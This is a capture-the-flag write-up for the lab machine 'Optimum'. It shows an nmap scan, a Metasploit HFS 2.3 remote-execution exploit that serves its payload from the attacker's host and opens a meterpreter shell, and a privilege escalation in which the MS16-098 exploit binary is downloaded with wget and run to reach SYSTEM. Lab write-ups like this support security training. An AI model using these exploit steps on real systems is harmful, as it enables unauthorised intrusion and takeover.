# Optimum

10.10.10.8

## Initial scan

```sh
nmap -A -T5 -p- 10.10.10.8
```

Results

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 06:05 EDT
Nmap scan report for 10.10.10.8
Host is up (0.20s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.73 seconds
```

## Gobuster

Since there's only 1 port, let's try gobuster on this

```sh
gobuster dir -u 10.10.10.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This takes too long. Going to let it run in the background while looking for other exploits

## Metasploit

Looking online, there's an exploit for this specific version of http file server version 2.3.

```sh
msfconsole
use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
# rhosts => 10.10.10.8
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST 10.10.14.14
# SRVHOST => 10.10.14.14
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 8080
# SRVPORT => 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > run
```

and a meterpreter shell is spawned. This gives us our first flag for the user `OPTIMUM\kostas`

## Privilege escalation

Let's look for some windows security vulnerabilities within this windows version.

### Getting systeminfo

```sh
execute -f "cmd.exe /c systeminfo > systeminfo.txt"
download systeminfo.txt
```

### Installing windows-exploit-suggester

Install windows-exploit-suggester from here: [exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

unzip the file and add it to `/usr/local/bin`

```sh
unzip Windows-exploit-suggester
cd Windows-expolit-suggester
suco cp Windows-exploit-suggester.py /usr/local/bin
```

### Using windows-expolit-suggester

Make sure the sysinfo.txt file and the database file is placed in the same directory, then

```sh
windows-exploit-suggest.py --update
windows-exploit-suggester.py --database 2020-04-10-mssb.xls --systeminfo systeminfo.txt
```

result:

```
[*] initiating winsploit version 3.3...                                                                                                                                      
[*] database file detected as xls or xlsx based on extension                                                                                                                 
[*] attempting to read from the systeminfo input file                                                                                                                        
[+] systeminfo input file read successfully (ISO-8859-1)                                                                                                                     
[*] querying database file for potential vulnerabilities                                                                                                                     
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits                                                                 
[*] there are now 246 remaining vulns                                                                                                                                        
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                                                                                           
[+] windows version identified as 'Windows 2012 R2 64-bit'                                                                                                                   
[*]                                                                                                                                                                          
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                                                                                          
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)                                                           
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)                         
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                                                                                            
[*]                                                                                                                                                                          
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important                                                                                          
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                                                         
[*]                                                                                                                                                                          
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                                                                                                   
[*]   https://github.com/foxglovesec/RottenPotato                                                                                                                            
[*]   https://github.com/Kevin-Robertson/Tater                                                                                                                               
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege                                          
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation                                                                       
[*]                                                                                                                                                                          
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                                                                                         
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074),
 PoC                                                                                                                                                                         
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC                                            
[*]                                                                                                                                                                          
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical                                                                                          
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
...
```

The most interesting result so far is MS16–098. So let's try that.

### Msfconsole

first, background the meterpreter session. Then:

```sh
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
sessions <meterpreter session ID>
upload 41020.exe
shell
41020.exe
whoami # system
```